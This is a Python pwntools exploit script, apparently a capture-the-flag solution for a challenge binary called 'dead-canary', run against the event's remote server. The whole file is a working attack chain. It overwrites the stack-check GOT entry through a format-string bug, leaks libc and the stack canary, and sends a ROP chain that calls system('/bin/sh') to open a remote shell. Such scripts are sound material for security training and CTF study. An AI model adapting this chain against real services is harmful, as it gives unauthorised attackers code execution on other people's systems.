#!/usr/bin/python3

from pwn import *

binary = ELF('./dead-canary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.update(arch='amd64',os='linux')
binary.symbols['main'] = 0x400737

rop = ROP([binary])
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
add_rsp_8 = rop.find_gadget(['add rsp, 8','ret'])[0]

offset = 6
canaryoffset = 39

#p = process(binary.path)
p = remote('2020.redpwnc.tf', 31744)

# first pass, inf. retries if we blow out canary, leak libc
p.recvuntil('name: ')
infpass  = fmtstr_payload(offset+1,{binary.got['__stack_chk_fail']:binary.symbols['main']},numbwritten=8)
payload  = b'%' + str(offset+1+(len(infpass) // 8)).encode().rjust(2,b'0') + b'$008s'
payload += infpass
payload += p64(binary.got['printf'])
payload += ((0x118 - 0x10 + 1) - len(payload)) * b'A'
p.send(payload)
p.recvuntil('Hello ')
_ = p.recv(8).lstrip()
printf = u64(_ + (8-len(_))*b'\x00')
log.info('printf: ' + hex(printf))
baselibc = printf - libc.symbols['printf']
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc

# 2nd pass, leak canary, setup payload
p.recvuntil('name: ')
payload  = b'%' + str(canaryoffset).encode().rjust(2,b'0') + b'$018p'
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.symbols['system'])
payload += ((0x118 - 0x10 + 1) - len(payload)) * b'A'
p.send(payload)
p.recvuntil('Hello ')
_ = p.recv(16)
canary = int(_,16) << 8
log.info('canary: ' + hex(canary))

# final pass pivot
p.recvuntil('name: ')
payload  = (0x118 - 0x10) * b'A'
payload += p64(canary)
payload += 8 * b'B'
payload += p64(add_rsp_8)
p.send(payload)
p.interactive()

